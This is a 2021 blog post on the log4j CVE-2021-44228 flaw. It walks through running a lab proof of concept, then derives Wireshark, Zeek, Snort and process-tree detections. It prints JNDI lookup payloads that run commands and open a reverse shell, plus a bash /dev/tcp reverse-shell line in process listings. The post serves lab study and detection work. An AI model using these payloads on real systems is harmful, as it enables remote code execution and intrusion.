<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="log4j JNDI Exploitation" /><meta property="og:locale" content="en_US" /><meta name="description" content="Situation A remote code execution (RCE) bug was found in log4j. CVE 2021-44228 has been assigned to it. The vulnerability lies in how log4j interprets Java Naming and Directory Interface (JNDI) URLs. JNDI lets an application look up a service. An attacker can craft a string that looks like “${jndi:proto://host/a}” where proto is ldap or rmi, and log4j will connect to the host to retrieve a, which would specify how to process the log entry. However, a can instead provide Java bytecode that log4j will execute." /><meta property="og:description" content="Situation A remote code execution (RCE) bug was found in log4j. CVE 2021-44228 has been assigned to it. The vulnerability lies in how log4j interprets Java Naming and Directory Interface (JNDI) URLs. JNDI lets an application look up a service. An attacker can craft a string that looks like “${jndi:proto://host/a}” where proto is ldap or rmi, and log4j will connect to the host to retrieve a, which would specify how to process the log entry. However, a can instead provide Java bytecode that log4j will execute." /><link rel="canonical" href="https://kimobu.github.io/posts/log4j-JDNI-Exploitation/" /><meta property="og:url" content="https://kimobu.github.io/posts/log4j-JDNI-Exploitation/" /><meta property="og:site_name" content="kimobu" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-10T00:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="log4j JNDI Exploitation" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-12-14T14:48:33-05:00","datePublished":"2021-12-10T00:00:00-05:00","description":"Situation A remote code execution (RCE) bug was found in log4j. CVE 2021-44228 has been assigned to it. The vulnerability lies in how log4j interprets Java Naming and Directory Interface (JNDI) URLs. JNDI lets an application look up a service. An attacker can craft a string that looks like “${jndi:proto://host/a}” where proto is ldap or rmi, and log4j will connect to the host to retrieve a, which would specify how to process the log entry. However, a can instead provide Java bytecode that log4j will execute.","headline":"log4j JNDI Exploitation","mainEntityOfPage":{"@type":"WebPage","@id":"https://kimobu.github.io/posts/log4j-JDNI-Exploitation/"},"url":"https://kimobu.github.io/posts/log4j-JDNI-Exploitation/"}</script><title>log4j JNDI Exploitation | kimobu</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="kimobu"><meta name="application-name" content="kimobu"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">kimobu</a></div><div class="site-subtitle font-italic">Docendo discimus</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/kimobu" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['kimo','kimobu.space'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://infosec.exchange/@kimobu" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>log4j JNDI Exploitation</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>log4j JNDI Exploitation</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Kimo B </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Dec 10, 2021, 12:00 AM -0500" prep="on" > Dec 10, 2021 <i class="unloaded">2021-12-10T00:00:00-05:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Dec 14, 2021, 7:48 PM +0000" prefix="Updated " > Dec 14, 2021 <i class="unloaded">2021-12-14T14:48:33-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1773 words">9 min</span></div></div><div class="post-content"><h1 id="situation">Situation</h1><p>A <a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">remote code execution (RCE) bug was found in log4j</a>. <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE 2021-44228</a> has been assigned to it. The vulnerability lies in how log4j interprets Java Naming and Directory Interface (JNDI) URLs. JNDI lets an application look up a service. An attacker can craft a string that looks like “${jndi:proto://host/a}” where <code class="language-plaintext highlighter-rouge">proto</code> is ldap or rmi, and log4j will connect to the <code class="language-plaintext highlighter-rouge">host</code> to retrieve <code class="language-plaintext highlighter-rouge">a</code>, which would specify how to process the log entry. However, <code class="language-plaintext highlighter-rouge">a</code> can instead provide Java bytecode that log4j will execute.</p><p>log4j is used in <a href="https://github.com/YfryTchsGD/Log4jAttackSurface">a lot of places</a>. The attacker can submit malicious input to multiple places. This includes: in a web form, as a user-agent, by renaming their Tesla, or sending a chat in Minecraft. Where the vulnerability manifests depends on how that organization’s infrastructure is configured. For <a href="https://twitter.com/morimi01918178/status/1469328940313759744">example</a>, it looks like naming your Airpods in the right format can induce a remote connection from Apple’s iCloud servers. Airpods are synced across all devices that a user owns via iCloud, so clearly log4j is logging the Airpods name at some point during the sync process. Minecraft servers, and every user connected to the server, are getting popped because both the client and server are using log4j to log chat messages.</p><p>In the rest of this blog, we’ll look at getting a Proof of Concept (PoC) running and what indicators we can extract from the networks and endpoints.</p><h1 id="get-the-poc-running">Get the PoC running</h1><p>The first PoC I found was from <a href="https://github.com/tangxiaofeng7/apache-log4j-poc">tangxiaofeng7</a>. This has a vulnerable “app” that simply calls log4j with a malicious endpoint. The Github page shows macOS Calculator.app being run as the payload. I’m going to use Ubuntu Linux as my test system, so I need to either figure out how to change payload or find a different way of running the payloads. During research, I find <a href="https://github.com/0x727/JNDIExploit">JNDIExploit</a>. log4j is the “access” vector, but the actual bad thing happens due to JNDI. Let’s use that.</p><ol><li>Set up a new VM, Ubuntu 18.04. We need a Java Dev Kit and Maven. Clone the repo.</ol><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>apt install openjdk-8-jdk maven
git clone https://github.com/tangxiaofeng7/apache-log4j-poc.git
git clone https://github.com/0x727/JNDIExploit
</pre></table></code></div></div><ol><li>Build the projects Spent way more time than I’d like trying to figure out how Java projects work.</ol><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>cd JNDIExploit/
mvn package
cd target
java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 0.0.0.0
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">ss -anpt</code> shows 1389/tcp and 3456/tcp running, great success. 1389 is implementing an LDAP endpoint that will “instruct” the vulnerable log4j function to connect to another location and execute the bytecode found there. 3456 is running an HTTP server that hosts the malicious bytecode. Unfortunately, a straight build does not work for the log4j poc. Had quite a few problems getting org.apache.logging.log4j to load. Seems like there are several methods to get it working, but here’s what I did.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cd ~/apache-log4j-poc
vim pom.xml
</pre></table></code></div></div><p>The POM file is a manifest for the Maven project. We add the maven-shade-plugin to generate an Uber JAR that includes log4j jars.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>&lt;build&gt;
	&lt;plugins&gt;
	&lt;plugin&gt;
		&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
		&lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt;
		&lt;version&gt;2.4.1&lt;/version&gt;
		&lt;executions&gt;
	  		&lt;execution&gt;
				&lt;phase&gt;package&lt;/phase&gt;
				&lt;goals&gt;
		  		&lt;goal&gt;shade&lt;/goal&gt;
				&lt;/goals&gt;
				&lt;configuration&gt;
		  		&lt;transformers&gt;
					&lt;transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer"&gt;
			  		&lt;mainClass&gt;log4j&lt;/mainClass&gt;
					&lt;/transformer&gt;
		  		&lt;/transformers&gt;
				&lt;/configuration&gt;
	  		&lt;/execution&gt;
		&lt;/executions&gt;
	  &lt;/plugin&gt;
	&lt;/plugins&gt;
&lt;/build&gt;
</pre></table></code></div></div><p>Now we can build with <code class="language-plaintext highlighter-rouge">mvn clean package</code>. This removes everything in a <code class="language-plaintext highlighter-rouge">target</code> directory and then packages the project into a .jar. We can then execute it with <code class="language-plaintext highlighter-rouge">java -jar target/log4j-rce-1.0-SNAPSHOT.jar</code>. If we do, wee see the message</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>01:27:16.300 [main] ERROR log4j - ${jndi:ldap://127.0.0.1:1389/a}
</pre></table></code></div></div><p>And from the terminal window in which JNDIExploit is running from, we see</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[+] Received LDAP Query: a
[!] Invalid LDAP Query: a
</pre></table></code></div></div><p>If we run <code class="language-plaintext highlighter-rouge">JNDIExploit-1.3-SNAPSHOT.jar -u</code> we see the list of endpoints we can specify. We need to match the <code class="language-plaintext highlighter-rouge">a</code> value to a legitimate endpoint that JDNIExploit is serving up. Edit <code class="language-plaintext highlighter-rouge">apache-log4j-poc/src/main/java/log4j.java</code> to call something that legit. Inside of the main class, I put a bunch of payloads so I can later compare what happens.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>logger.error("${jndi:ldap://127.0.0.1:1389/Basic/Command/whoami}");
logger.error("${jndi:ldap://127.0.0.1:1389/Basic/Dnslog/---.canarytokens.com}"); // get your own token at https://canarytokens.org/generate#
logger.error("${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/d2hvYW1pCg==}");   // whoami
logger.error("${jndi:ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444}");
logger.error("${jndi:ldap://127.0.0.1:1389/Basic/TomcatEcho}");
logger.error("${jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/---.canarytokens.com}");
logger.error("${jndi:ldap://127.0.0.1:1389/TomcatBypass/Dnslog/---.canarytokens.com}");
logger.error("${jndi:ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/---.canarytokens.com}");
logger.error("${jndi:ldap://127.0.0.1:1389/TomcatBypass/Dnslog/---.canarytokens.com}");
</pre></table></code></div></div><p>Once edited, we call <code class="language-plaintext highlighter-rouge">mvn clean package</code> again and then re-run the jar. This time, we see errors like <code class="language-plaintext highlighter-rouge">01:31:06.557 [main] ERROR log4j - Reference Class Name: foo</code>, however we get successful connections to JDNIExploit that look like:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[+] Sending LDAP ResourceRef result for Basic/Command/Base64/d2hvYW1pCg== with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/d2hvYW1pCg== redirecting to http://0.0.0.0:3456/ExploittvsunipOlR.class
</pre></table></code></div></div><p>If we had a packet capture running at this point, we’d see that the LDAP server is being connected to, but that HTTP server running on 3456/tcp is not being connected to. It turns out we’ve known <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">since 2016</a> that JDNI is a vector for exploitation, and <a href="https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en-US">since Java 8u191</a> the default has been to not connect to URLs provided in a JNDI string. So we need to add <code class="language-plaintext highlighter-rouge">System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");</code> to log4j.java, before we call logger.</p><p>Now everything should work. I’ll start tcpdump to capture packets before re-running the vulnerable jar (<code class="language-plaintext highlighter-rouge">tcpdump -i lo -s 65535 -w /home/user/ldap.pcap tcp port 1389 or tcp port 3456</code>), and start a netcat listener to catch the reverse shell (<code class="language-plaintext highlighter-rouge">nc -nvlp 4444</code>). This time, both the LDAP and HTTP servers receive connections, you will trigger the DNS canary token, and receive a reverse shell to your listener.</p><h1 id="observables">Observables</h1><h2 id="killchain-scenarios">Killchain scenarios</h2><p>How can we detect or hunt for this activity? There are 2 scenarios that I’ve identified so far. Scenario 1 involves the LDAP JNDI lookup returning a javaNamingReference object that specifies a “second stage”. Two network connections are initiated from the vulnerable machine in this scenario - one to an LDAP server to perform the lookup, and a second to an HTTP server to download a Java object. This is the scenario demonstrated by the PoC (https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce). In the JNDIExploit framework, the “Basic” payloads use this scenario. We can see this in the following PCAP screenshot.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/log4j-pcap.png" alt="log4j exploitation pcap" /></p><p>A flow chart of this scenario looks like:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/log4j-jnr.png" alt="log4j with javaNamingReference" /></p><p>Scenario 2 is where the LDAP JNDI lookup returns a javaSerializedData object. Only one network connection is made in this scenario. The searchResEntry object contains an attribute javaSerializedData which is exactly that - serialized Java bytecode. This bytecode is deserialized by log4j and executed. Its flow chart:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/log4j-jsd.png" alt="log4j with javaSerializedData" /></p><h2 id="detections">Detections</h2><h3 id="network">Network</h3><p>Can we detect malicious input? The whole purpose of log4j is to log, so the malicious input is going <em>somewhere</em>. Is that log being centralized and indexed? Can we prevent the attack at (1)? Maybe. If the input vector is in line with something like a Web App Firewall (WAF), you might be able to block it before it gets to the vulnerable function. However, not every implementation has that opportunity, and even if you do, there are a lot of <a href="https://twitter.com/stereotype32/status/1469313856229228544?s=20">permutations</a> that could make blocking with a WAF hard. A lot of the detection work that I’ve seen is focused on the input. This makes sense, because we want to prevent the attack from happening in the first place. My personal opinion is that this is a whackamole approach of trying to detect each new bypass technique as it is developed.</p><p>Can we detect the LDAP queries? By default, yes we should be able to. LDAP normally occurs over 389/tcp. However, we saw with JNDIExploit that it was running LDAP on 1389. Changing the port can obscure the traffic, but a protocol dissector can still identify LDAP since it is clear text. We can inspect outgoing traffic for LDAP using a tool like Suricata, and potentially block once it is observed.</p><p>Looking through the PCAPs that were made earlier, we can observe that there are a sequence of bytes in the packet payload that are the same for every LDAP packet. We’ll call these magic bytes since they fingerprint the protocol. In Wireshark, the following display filter showed only the LDAP queries.</p><p><code class="language-plaintext highlighter-rouge">data[0:1] == 0x30 &amp;&amp; (data[2:4] == 02.01.02.63 || data[3:4] == 02.01.02.63)</code></p><p>In this screenshot we see these values highlighted in the hex dump. I’m not sure why the 02.01.02.63 sequence occurs sometimes at offset 0x2 and sometimes at 0x3.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/ldap-wireshark.png" alt="ldap traffic in Wireshark" /></p><p>Can we detect the LDAP responses? Remember there are two scenarios. One is a response with javaSerializedData and the other is javaNamingReference. The observed magic bytes for javaSerializedData are ac:ed:00:05:73:72:00. A Wireshark display filter is:</p><p><code class="language-plaintext highlighter-rouge">data[0:1] == 0x30 &amp;&amp; data[1:1] == 0x82 &amp;&amp; tcp contains ac:ed:00:05:73:72:00</code></p><p>For javaNamingReference, it is the string “javaNamingReference”. In Wireshark that’s:</p><p><code class="language-plaintext highlighter-rouge">data[0:1] == 0x30 &amp;&amp; data[1:1] == 0x81 &amp;&amp; tcp contains 6a:61:76:61:4e:61:6d:69:6e:67:52:65:66:65:72:65:6e:63:65</code></p><p>Can we detect the HTTP transfer of Java bytecode? By default, yes we should be able to. HTTP is cleartext. I think due to the presence of HTTP headers, Wireshark was able to automatically decode traffic over 3456/tcp. Zeek/Suricata may be able to do this as well. If so, it should be fairly simple to look for Java bytecode being sent over the wire. This Wireshark filter will show the Java magic bytes 0xcafebabe being sent:</p><p><code class="language-plaintext highlighter-rouge">data.data[0:4] == ca:fe:ba:be</code></p><p>And Zeek successfully sees the file:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/log4j-zeek-java.png" alt="Zeek decode of Java transfer" /></p><h3 id="host">Host</h3><p>What can we detect on host? This is the tough one. On one hand, you can detect “weak” attacks that spawn new processes. Here is the process list (<code class="language-plaintext highlighter-rouge">ps -efwwwH</code>) from the reverse shell:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root      9171     1  0 01:38 pts/4    00:00:00   /bin/bash -c /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.146/4444 0&gt;&amp;1
root      9172  9171  0 01:38 pts/4    00:00:00     /bin/bash -i
root      9194  9172  0 01:38 pts/4    00:00:00       ps -efwwwH
</pre></table></code></div></div><p>The clear indicator is the <a href="https://www.gnucitizen.org/blog/reverse-shell-with-bash/">/dev/tcp</a> trick to create a TCP connection. Here, bash is a child of init. This may be implementation specific. The PoC is a single function .jar file. Once the java process exits, its children (bash in this case) are reaped and inherited by init. On a “real” server application, the java process is not likely to exit after log4j is called, so the process tree will look different. What we should see in that case is java as the parent of bash. After modifying the PoC to sleep for 10 minutes after calling the logger function, that’s exactly what we see:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>root     10926 10770  7 14:31 pts/5    00:00:00       java -jar target/log4j-rce-1.0-SNAPSHOT.jar
root     10948 10926  0 14:31 pts/5    00:00:00         ping -c 1 ---.canarytokens.com
root     10956 10926  0 14:31 pts/5    00:00:00         /bin/bash -c /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.146/4444 0&gt;&amp;1
root     10957 10956  0 14:31 pts/5    00:00:00           /bin/bash -i
root     10975 10957  0 14:31 pts/5    00:00:00             ps -efwwwH
</pre></table></code></div></div><h1 id="snort-rules">Snort rules</h1><p>I’ve turned the Wireshark display filters above into Snort rules. They can be found in this repo: <a href="https://github.com/kimobu/cve-2021-44228">kimobu/cve-2021-44228</a></p><h1 id="changelog">Changelog</h1><p>12/12/2021 - updated with additional detection information</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/homelab/" class="post-tag no-text-decoration" >homelab</a> <a href="/tags/offsec/" class="post-tag no-text-decoration" >offsec</a> <a href="/tags/research/" class="post-tag no-text-decoration" >research</a> <a href="/tags/purpleteam/" class="post-tag no-text-decoration" >purpleteam</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=log4j JNDI Exploitation - kimobu&url=https://kimobu.github.io/posts/log4j-JDNI-Exploitation/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=log4j JNDI Exploitation - kimobu&u=https://kimobu.github.io/posts/log4j-JDNI-Exploitation/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=log4j JNDI Exploitation - kimobu&url=https://kimobu.github.io/posts/log4j-JDNI-Exploitation/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/SecurityOnion-GPT/">SecurityOnion GPT</a><li><a href="/posts/Adding-Phishing-to-the-Homelab/">Putting phishing data into Security Onion</a><li><a href="/posts/Books-of-2022/">Recap of the books I read in 2022</a><li><a href="/posts/Books-of-2021/">Recap of the books I read in 2021</a><li><a href="/posts/Books-of-2017/">Recap of the books I read in 2017</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/books/">books</a> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/school/">school</a> <a class="post-tag" href="/tags/dns/">dns</a> <a class="post-tag" href="/tags/doh/">doh</a> <a class="post-tag" href="/tags/networking/">networking</a> <a class="post-tag" href="/tags/offsec/">offsec</a> <a class="post-tag" href="/tags/ai/">ai</a> <a class="post-tag" href="/tags/kali/">kali</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Hacking-a-Computer-Remotely-through-a-Phone/"><div class="card-body"> <span class="timeago small" > May 1, 2021 <i class="unloaded">2021-05-01T00:00:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hacking a Computer Remotely through a Phone</h3><div class="text-muted small"><p> In a recent demonstration of cyber and electronic warfare capabilities, I had the opportunity to enable access into a network by exploiting a computer remotely through a cell phone. In this blog po...</p></div></div></a></div><div class="card"> <a href="/posts/Security-Onion-Proxmox/"><div class="card-body"> <span class="timeago small" > May 26, 2021 <i class="unloaded">2021-05-26T00:00:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Security Onion on Proxmox</h3><div class="text-muted small"><p> Security Onion on Proxmox I originally set up my homelab using Ovirt, but have since switched back to Proxmox. The reason for that is that the version of qemu that Ovirt ships with does not support...</p></div></div></a></div><div class="card"> <a href="/posts/macOS-Homelab/"><div class="card-body"> <span class="timeago small" > May 10, 2023 <i class="unloaded">2023-05-10T00:00:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Adding macOS to my security homelab</h3><div class="text-muted small"><p> This post has notes on how I added a macOS machine to my security homelab. Install macOS to Proxmox Follow this guide to install macOS onto a Proxmox cluster. This will result in an x86 based VM. ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Security-Onion-Proxmox/" class="btn btn-outline-primary" prompt="Older"><p>Security Onion on Proxmox</p></a> <a href="/posts/Books-of-2021/" class="btn btn-outline-primary" prompt="Newer"><p>Recap of the books I read in 2021</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/kimobu">Kimo B</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/books/">books</a> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/school/">school</a> <a class="post-tag" href="/tags/dns/">dns</a> <a class="post-tag" href="/tags/doh/">doh</a> <a class="post-tag" href="/tags/networking/">networking</a> <a class="post-tag" href="/tags/offsec/">offsec</a> <a class="post-tag" href="/tags/ai/">ai</a> <a class="post-tag" href="/tags/kali/">kali</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 